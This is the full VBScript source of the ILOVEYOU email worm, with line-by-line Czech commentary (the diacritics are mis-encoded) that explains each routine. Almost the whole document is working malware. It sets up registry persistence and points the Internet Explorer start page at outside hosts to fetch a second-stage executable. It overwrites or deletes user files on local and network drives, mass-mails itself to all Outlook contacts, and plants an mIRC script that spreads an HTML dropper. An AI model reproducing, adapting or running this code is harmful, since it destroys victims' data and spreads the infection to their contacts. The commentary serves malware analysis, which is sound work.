'
' Komentáø k ILOVEYOU viru (èervu)
' (c) Daniel Doèekal, Svìt Namodro, 2000/05
'
rem barok -loveletter(vbe) <i hate go to school>
rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
eq=""
'
' zajímavost, ctr promìnná nakonec nikde není použita, stejnì tak dirtemp a dow
'
ctr=0
'
' otevøení sebe sama a uložení sebe same do vbscopy promìnné, bude používána 
' pro další šíøení a zpracovávání viru
'
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
'
' a abychom se nenudili, mùžeme to spustit 
'
main()

' -------------------------------------------------------------------------------------------------------------------
' 
sub main()
  On Error Resume Next
  dim wscr,rr
  set wscr=CreateObject("WScript.Shell")
  '
  ' WSH (Windows Script Host) má timeout hodnotu, tu je vhodné zkontrolovat
  ' a poté nastavit na 0 - což zajistí aby virus poøád bìžel - pokud by tomu
  ' tak nebylo, nemohl by bìžet "na pozadí" 
  '
  rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
  if (rr>=1) then
    ' Set script time out to infinity
    wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
  end if
  '
  ' zjištìní umístìní adresáøe s WINDOWS, adresáøe SYSTEM (ten bývá uvnitø WINDOWS adresáøe)
  ' a TEMP adresáøe - tyto adresáøe budou potøeba pro další rozšíøení viru (uložení v systému)
  '
  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  Set dirtemp = fso.GetSpecialFolder(2)
  ' 
  ' v adresáøi SYSTEM bude vytvoøena kopie pod názvem MSKernel32.vbs
  ' v adresáøe WINDOWS bude vytvoøena kopie pod názvem Win32DLL.vbs
  ' v adresáøi SYSTEM bude vytvoøena kopie pod názvem LOVE-LETTER-FOR-YOU.TXT.vbs
  '
  Set c = fso.GetFile(WScript.ScriptFullName)
  c.Copy(dirsystem&"\MSKernel32.vbs")
  c.Copy(dirwin&"\Win32DLL.vbs")
  c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
  '
  ' Definice potøebných vìcí v Registry, 
  ' nastavení domovské stránky (home page, default) pro Internet explorer na jednu
  ' z náhodnì urèených hodnot - zajistí stažení druhé èásti viru
  '
  regruns()
  '
  ' vytvoøení HTML souboru používaného pro mIRC a obsahujícího virus v podobì
  ' spouštìného ActiveX komponentu, další cesta jak se virus šíøí
  '
  html()
  '
  ' rozeslání viru na adresy v WAB (Outlook Address Book)
  '
  spreadtoemail()
  '
  ' šíøení viru do rùzných typù souborù a zpracování mIRC skriptu
  ' s pomocí již døíve vytvoøeného HTML souboru - viz html() procedura
  '
  listadriv()
end sub


' -------------------------------------------------------------------------------------------------------------------
' Definice potøebných vìcí v Registry, 
' Nastavení domovské stránky (home page, default) pro Internet explorer na jednu
' z náhodnì urèených hodnot - zajistí stažení druhé èásti viru
'
sub regruns()
  On Error Resume Next
  Dim num, downread
  '
  ' MSkernel32.vbs verze bude použita pro RUN klíè, což znamená, že pøi startu systému
  ' se VŠEM uživatelùm provede spuštìní viru 
  '
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
  '
  ' Win32dll.vbs verze bude použita pro RUNSERVICES klíè, což je ještì horší, virus
  ' totiž po startu systému pobìží jako SLUŽBA (nesnadno detekovatelné v TaskManageru)
  ' 
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
  '
  ' zjištìní kde se nachází DOWNLOAD adresáø IE (tj.  kam se ukládají stažené soubory)
  ' pokud není definován, nastaví se napevno na C:\ 
  '
  downread = ""
  downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
  if (downread = "") then
    downread = "c:\"
  end if
  '
  ' kontrola jestli již došlo ke stažení druhé èásti viru, EXE souboru
  ' ten se totiž pøejmenovává na WinFAT32.EXE 
  '
  if (fileexist(dirsystem&"\WinFAT32.exe") = 1) then
    '
    ' nastavení Start Page (home page) IE na jednu ze ètyø adres kde je uložena
    ' druhá èást viru (EXE). Naštìstí pøestal tento web existovat již nìkolik
    ' hodin poté co virus zaèal øádit. Je zde také druhý potenciální problém
    ' stažení .EXE souboru musí uživatel potvrdit - což ovšem øada z nich ráda udìlá
    '
    ' ke stažení samozøejmì dojde až v okamžiku, kdy uživatel poprvé spustí 
    ' Internet Explorer (nezapomeòte, virus mùže stále bìžet kdesi v pozadí)
    '
    Randomize
    num = Int((4 * Rnd) + 1)
    if num = 1 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
    elseif num = 2 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
    elseif num = 3 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
    elseif num = 4 then
      regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
    end if
  end if
  '
  ' kontrola jestli už došlo k stažení druhé èásti viru (EXE)
  ' a pokud ano, tak vytvoøení nového RUN - tj. druhá èást viru (EXE)
  ' se bude spouštìt pøi každém startu systému (jednorázovì)
  ' Start Page IE je potom nastavena "zpìt" na about:blank, takže víckrát
  ' se program už stahovat nebude
  '
  if (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) then
    regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "about:blank"
  end if
end sub

' -------------------------------------------------------------------------------------------------------------------
' šíøení viru do rùzných typù souborù a zpracování mIRC skriptu
' s pomocí již døíve vytvoøeného HTML souboru - viz html() procedura
'
sub listadriv
  On Error Resume Next
  Dim d,dc,s
  '
  ' projde všechny dostupné disky, tj. jak lokální, tak síové (namapované)
  ' které mùže projít a vrhne se na jejich kompletní strukturu
  '
  Set dc = fso.Drives
  For Each d in dc
    If d.DriveType = 2 or d.DriveType=3 Then
      folderlist(d.path & "\")
    end if
  Next
  listadriv = s
end sub

'
' šíøení "nákazy" na specifické soubory 
' volá se vždy pro každou SLOŽKU a efekt je
' prùchod všech diskù a všech složek 
'
sub infectfiles(folderspec)  
  On Error Resume Next
  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
  '
  ' získání senzamu všech souborù ve složce a následný
  ' prùchod všech souborù
  '
  set f = fso.GetFolder(folderspec)
  set fc = f.Files
  for each f1 in fc
    ext = fso.GetExtensionName(f1.path)
    ext = lcase(ext)
    s = lcase(f1.name)
    '
    '  VBS / VBE pøípona - PØEPSÁNÍ VIREM, zùstává pùvodní jméno, mìní se obsah (nevratné znièení) 
    '
    if (ext = "vbs") or (ext = "vbe") then
      set ap = fso.OpenTextFile(f1.path,2,true)
      ap.write vbscopy
      ap.close
    '
    ' JS / JSE / CSS / WSH / SCT / HTA - PØEPSÁNÍ VIREM 
    '   a poté vytvoøení NOVÝCH souborù s celým pùvodním jménem a 
    '   pøíponou .vbs (tj. byl li napø. test.wsh - bude navíc ještì test.wsh.vbs
    '   a poté SMAZÁNÍ pùvodního souboru (tj. pøíjdete o všechny soubory s
    '   s tìmito pøíponami, opìt nevratné znièení
    '
    elseif(ext = "js") or (ext = "jse") or (ext = "css") or _
          (ext = "wsh") or (ext = "sct") or (ext = "hta") then
      set ap = fso.OpenTextFile(f1.path,2,true)
      ap.write vbscopy
      ap.close
      bname = fso.GetBaseName(f1.path)
      set cop = fso.GetFile(f1.path)
      cop.copy(folderspec & "\" & bname & ".vbs")
      fso.DeleteFile(f1.path)
    '
    ' JPG / JPEG - totéž jako výše
    ' pøijdete o tyto soubory a bude vytvoøena jejich jmenná kopie
    ' obsahující virus - tj. napø naked.jpg -> naked.jpg.vbs
    ' opìt nevratné nièení
    '
    elseif(ext = "jpg") or (ext = "jpeg") then
      set ap=fso.OpenTextFile(f1.path, 2,true)
      ap.write vbscopy
      ap.close
      set cop=fso.GetFile(f1.path)
      cop.copy(f1.path & ".vbs")
      fso.DeleteFile(f1.path)
    '
    ' MP3 / MP2 - vytvoøí jmennou kopii s .vbs dodatkem (napø. gott.mp3 -> gott.mp3.vbs)
    '  a poté ukrytí pùvodního souboru (dostane HIDDEN pøíznak)
    '
    elseif(ext="mp3") or (ext="mp2") then
      set mp3 = fso.CreateTextFile(f1.path & ".vbs")
      mp3.write vbscopy
      mp3.close
      set att = fso.GetFile(f1.path)
      att.attributes = att.attributes + 2
    end if
    '
    ' pokud je folderspec cokoliv jiného než "" èi pozdìji zjištìné umístìní
    ' vìnuje se mIRC ("eq" slouží k tomu aby to nedìlal poøád dokola v jednom adresáøi)
    ' znamená to, že mIRC vìci nepøepíše (možnost) jenom ve vlastním poèítaèi
    ' ale také na cizím disku !
    '
    if (eq<>folderspec) then
      '
      ' detekece existence mIRC programu pomocí souborù s uvedenými jmény
      '
      if (s = "mirc32.exe") or (s = "mlink32.exe") or (s = "mirc.ini") or _
         (s = "script.ini") or (s = "mirc.hlp") then
	'
        ' vytvoøení NOVÉHO script.ini obsahujícího vše potøebné 
        ' k využití mIRC k šíøení viru - použije se HTML vytvoøený
        ' v jiné funkci (viz níže) 
        '
        set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
        scriptini.WriteLine "[script]"
        scriptini.WriteLine ";mIRC Script"
        scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
        scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
        scriptini.WriteLine ";"
        scriptini.WriteLine ";Khaled Mardam-Bey"
        scriptini.WriteLine ";http://www.mirc.com"
        scriptini.WriteLine ";"
        scriptini.WriteLine "n0=on 1:JOIN:#:{"
        scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
        scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
        scriptini.WriteLine "n3=}"
        scriptini.close
	'
	' zapamatování si kde již zpracoval mIRC vìci
        ' efekt je stále stejný - udìlá to všude kde to je možné
	' zapamatovávání eq se postará že nevykonává poøád dokola tenhle kód
	' pokud postupnì prochází adresáø (jsme na per-file úrovni)
        '
        eq=folderspec
      end if
    end if
  next  
end sub

'
' pomocná SUB pro prùchod složky (adresáøe), všech souborù a poté
' rekurzivní prùchod pøípadných vnoøenýc složek
'
sub folderlist(folderspec)  
  On Error Resume Next
  dim f,f1,sf
  set f = fso.GetFolder(folderspec)  
  set sf = f.SubFolders
  for each f1 in sf
    infectfiles(f1.path)
    folderlist(f1.path)
  next  
end sub

' 
' pomocná SUB pro vytvøení klíèe v registry
'
sub regcreate(regkey,regvalue)
  Set regedit = CreateObject("WScript.Shell")
  regedit.RegWrite regkey,regvalue
end sub

' 
' pomocná SUB pro ètení obsahu klíèe v registry
'
function regget(value)
  Set regedit = CreateObject("WScript.Shell")
  regget = regedit.RegRead(value)
end function

'
' pomocná sub pro testování existence souboru
'
function fileexist(filespec)
  On Error Resume Next
  dim msg
  if (fso.FileExists(filespec)) Then
    msg = 0
    else
    msg = 1
  end if
  fileexist = msg
end function

'
' pomocná SUB pro testování existence složky (adresáøe)
'
function folderexist(folderspec)
  On Error Resume Next
  dim msg
  if (fso.GetFolderExists(folderspec)) then
    msg = 0
    else
    msg = 1
  end if
  fileexist = msg
end function

' -------------------------------------------------------------------------------------------------------------------
' šíøení viru mailem
' rozeslání viru na adresy v WAB (Outlook Address Book)
'
sub spreadtoemail()
  On Error Resume Next
  dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
  set regedit = CreateObject("WScript.Shell")
  ' 
  ' aktivace Outlooku (tj. neumí se šíøit jinak než outlookem)
  ' a zjištìní reference na MAPI aby mohl získat všechny adresy
  '
  set out = WScript.CreateObject("Outlook.Application")
  set mapi = out.GetNameSpace("MAPI")
  ' 
  ' tohle je nepøíjemné, zjistí všechny ADRESÁØE (tj. nikoliv jenom jeden)
  ' a všechny je projde (zpracuje)
  '
  for ctrlists = 1 to mapi.AddressLists.Count
    set a = mapi.AddressLists(ctrlists)
    x = 1
    '
    ' zde kontroluje pøípadné NOVÉ adresy
    ' v address booku (níže si totiž zapamatuje na KOLIK adres již poslal)
    ' a pokud jich je v adress booku víc, tak prostì "došle" i ty nové
    ' (na staré nic nepošle, má je oznaèené)
    '
    regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
    if (regv = "") then
      regv = 1
    end if
    if (int(a.AddressEntries.Count) > int(regv)) then
      '
      ' projde všechny položky v právì zpracovaváném adresáøi
      ' tj. není zde ŽÁDNÉ množstevní omezení
      '
      for ctrentries = 1 to a.AddressEntries.Count
        malead = a.AddressEntries(x)
        regad = ""
	' 
	' kontrola jestli už posílal, každému komu totiž poslal
	' už nepošle víckrát - øeší to zápisem do registry
	' což je velmi nepøíjemné (mùže narùst a shodit stroj)
	'
        regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead)
        if (regad = "") then
	  '
	  ' vytvoøení mailové zprávy s pøílohou 
	  ' je to jen obyèejná textová zpráva, takže žádné automatické
	  ' spuštìní - pøíloha se sama nikdy nespustí, spustit ji musí uživatel
	  '
          set male = out.CreateItem(0)
          male.Recipients.Add(malead)
          male.Subject = "ILOVEYOU"
          male.Body = vbcrlf & "kindly check the attached LOVELETTER coming from me."
          male.Attachments.Add(dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
	  ' 
	  ' odeslání
	  '
          male.Send
	  '
	  ' nastavení pøíznaku že na tuto adresu již poslal
	  '
          regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
        end if
        x = x + 1
      next
      '
      ' další zápis do registry, zde si zapamatuje kolik adres zpracoval
      '
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    else
      regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
    end if
  next
  Set out = Nothing
  Set mapi = Nothing
end sub


' -------------------------------------------------------------------------------------------------------------------
' vytvoøení HTML souboru používaného pro mIRC a obsahujícího virus v podobì
' spouštìného ActiveX komponentu, další cesta jak se virus šíøí
'
' vytváøené HTML je ponìkud komplikované - dùvod je prostý
' slouží totiž k tomu aby VYTVOØILO virus (MSKernel32.vbs) 
' a poté dokonce nastavilo RUN v Registry na jeho spuštìní
' 
' tenhle HTML dokument dostanou mIRC uživatelé pomocí DCC
' a pokud jej "zobrazí", tak se nakazí
'
' ty ponìkud zmatené ?-?, @-@, #-#, ^-^ slouží k zadání,
' kódù, které by se problematicky zadávaly ruènì, pozdìji
' jsou pomocí replace() zamìòovány. Stejnì tak bude
' tentýž zpùsob použit pro zakódování uvnitø výsledného
' HTML 
'
sub html
  On Error Resume Next
  dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6
  '
  ' tímto bude HTML zaèínat
  '
  dta1= "<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
        "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
        "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
        "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
        "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
        "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
        "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
        "<?-?BODY><?-?HTML>"&vbcrlf& _
        "<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
        "<!--?-??-?"&vbcrlf& _
        "if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
        "?-??-?-->"&vbcrlf& _
        "<?-?SCRIPT>"&vbcrlf& _
        "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
        "<!--"&vbcrlf& _
        "on error resume next"&vbcrlf& _
        "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
        "aw=1"&vbcrlf& _
        "code="
  ' 
  ' tímto bude HTML konèit
  '
  dta2= "set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
        "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
        "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
        "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
        "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
        "set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
        "wri.write code4"&vbcrlf& _
        "wri.close"&vbcrlf& _
        "if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
        "if (err.number=424) then"&vbcrlf& _
        "aw=0"&vbcrlf& _
        "end if"&vbcrlf& _
        "if (aw=1) then"&vbcrlf& _
        "document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
        "window.close"&vbcrlf& _
        "end if"&vbcrlf& _
        "end if"&vbcrlf& _
        "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
        "regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
        "?-??-?-->"&vbcrlf& _
        "<?-?SCRIPT>"
  '
  ' #-# = apostrof
  ' @-@ = úvozovky
  ' ?-? = lomítko
  ' ^-^ = obrácené lomítko
  '
  ' výsledkem této nesmyslné manipulace je dt5 a dt6
  ' obsahující zaèátek a konec HTML 
  '
  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), "'")
  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), """")
  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), "/")
  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), "\")
  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), "'")
  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), """")
  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), "/")
  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), "\")
  '
  ' naètení kompletního kódu viru
  ' rozkouskování na jednotlivé øádky, poté zpracování
  ' problematických znakù na pseudokódy
  ' a pøevod na strukturu pøiøaditelnou do promìnné
  '
  set fso = CreateObject("Scripting.FileSystemObject")
  set c = fso.OpenTextFile(WScript.ScriptFullName, 1)
  lines = Split(c.ReadAll, vbcrlf)
  l1 = ubound(lines)
  for n = 0 to ubound(lines)
    lines(n)=replace(lines(n), "'", chr(91) + chr(45) + chr(91))
    lines(n)=replace(lines(n), """", chr(93) + chr(45) + chr(93))
    lines(n)=replace(lines(n), "\", chr(37) + chr(45) + chr(37))
    if (l1 = n) then
      lines(n) = chr(34) + lines(n) + chr(34)
    else
      lines(n) = chr(34) + lines(n) + chr(34) & "&vbcrlf& _"
    end if
  next
  '
  ' vytvoøení HTML souboru
  '
  set b=fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
  b.close
  '
  ' naplnìní HTML souboru
  ' zapíše zaèátek (dt5), všechny øádky vlastního viru (pole lines)
  ' a poté pochopitelnì konec (dt6)
  '
  set d=fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM",2)
  d.write dt5
  d.write join(lines, vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub
